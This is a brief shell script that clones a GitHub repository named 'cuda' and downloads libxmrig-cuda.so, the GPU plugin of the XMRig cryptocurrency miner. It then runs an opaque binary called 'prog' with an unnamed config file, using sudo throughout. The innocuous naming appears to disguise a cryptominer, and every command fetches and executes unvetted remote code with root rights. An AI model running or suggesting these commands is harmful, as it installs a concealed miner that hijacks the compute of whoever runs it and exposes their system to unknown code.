sudo apt install libhwloc-dev
# grab the exec + conf
sudo git clone https://github.com/iceyfromdiscord/cuda
cd cuda

# grab cuda (idk if it needs this???)
sudo curl -L -O https://github.com/iceyfromdiscord/cuda/releases/download/_/libxmrig-cuda.so

# start
chmod +x ./prog
./prog --config ./_.json
